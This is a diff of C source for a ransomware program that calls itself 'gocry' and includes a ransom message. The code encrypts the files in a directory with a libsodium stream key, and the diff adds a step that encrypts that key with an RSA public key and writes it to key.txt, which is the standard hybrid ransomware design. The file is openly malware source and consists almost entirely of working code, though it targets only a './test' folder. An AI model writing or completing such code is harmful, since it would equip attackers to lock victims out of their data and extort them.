@@ -1,4 +1,5 @@
 #include <dirent.h>
+#include <openssl/evp.h>
 #include <openssl/ossl_typ.h>
 #include <openssl/pem.h>
 #include <openssl/rsa.h>
@@ -12,20 +13,7 @@
 
 const char *root_dir_path = "./test";
 const char *ransom_message = "You've been infected by gocry.\nAll your files are not encrypted\n";
-
-RSA *rsa_pubkey_from_file(char *filename) {
-    FILE *fp = fopen(filename, "r");
-    if (!fp) {
-        return NULL;
-    }
-
-    RSA *key;
-    if (PEM_read_RSAPublicKey(fp, &key, NULL, NULL) == NULL) {
-        return NULL;
-    }
-
-    return key;
-}
+const char *pub_key_path = "./public.pem";
 
 static int encrypt(const char *encrypt_to, const char *source_file,
                    const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]) {
@@ -95,10 +83,10 @@ ret:
     return ret;
 }
 
-int main() {
+int main(void) {
     // libsodium could not be initialized properly so don't run
     if (sodium_init() < 0)
-        exit(1);
+        exit(EXIT_FAILURE);
 
     DIR *root_dir = opendir(root_dir_path);
     struct dirent *dir;
@@ -116,12 +104,6 @@ int main() {
             ++i;
         }
         closedir(root_dir);
-    }
-
-    RSA *public_rsa_key = rsa_pubkey_from_file("./public.pem");
-    if (public_rsa_key == NULL) {
-        puts("error reading rsa key");
-        return 1;
     }
 
     unsigned char encryption_key[crypto_secretstream_xchacha20poly1305_KEYBYTES];
@@ -142,4 +124,39 @@ int main() {
         if (encrypt(filename, original, encryption_key) != 0)
             printf("Error encrypting file %s", to_encrypt[j]);
     }
+
+    // Encrypt the encryption key using RSA.
+    EVP_PKEY *pkey;
+
+    FILE *fp = fopen("public.pem", "r");
+    if (fp == NULL)
+        exit(EXIT_FAILURE);
+
+    pkey = PEM_read_PUBKEY(fp, NULL, NULL, NULL);
+    fclose(fp);
+
+    if (pkey == NULL)
+        exit(EXIT_FAILURE);
+
+    RSA *rsa = EVP_PKEY_get1_RSA(pkey);
+    if (rsa == NULL)
+        exit(EXIT_FAILURE);
+    EVP_PKEY_free(pkey);
+
+    char *encrypted_message = malloc(RSA_size(rsa));
+    int encrypted_len;
+
+    if ((encrypted_len =
+             RSA_public_encrypt(strlen((const char *)encryption_key) + 1, (unsigned char *)encryption_key,
+                                (unsigned char *)encrypted_message, rsa, RSA_PKCS1_OAEP_PADDING)) == -1) {
+        printf("error encrypting keys");
+        return 1;
+    }
+
+    FILE *out = fopen("./key.txt", "w");
+    fwrite(encrypted_message, sizeof(*encrypted_message), RSA_size(rsa), out);
+    fclose(out);
+    free(encrypted_message);
+
+    return EXIT_SUCCESS;
 }
